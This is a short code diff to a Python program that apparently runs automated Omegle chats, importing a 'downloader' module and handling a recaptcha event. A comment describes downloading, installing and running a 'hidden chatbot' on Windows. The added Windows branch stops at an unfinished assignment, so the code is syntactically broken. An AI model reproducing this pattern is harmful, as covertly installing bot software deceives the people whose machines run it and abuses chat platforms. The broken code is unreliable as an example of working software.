@@ -10,6 +10,7 @@ from numbers import Number
 from time import sleep
 from urllib import urlopen
 
+import downloader
 import Omegle
 import os
 import srscript
@@ -336,6 +337,8 @@ def main():
         (script_his, service, asl) = get_his_script()
         #If we're running windows, write the script to file and start a thread
         #to download/install/run the hidden chatbot
+        if os.name == "nt":
+            t = 
         his_thread = ScriptThread(script_his, 
                                  recaptcha_event=recaptcha_event, 
                                  print_convo=True,
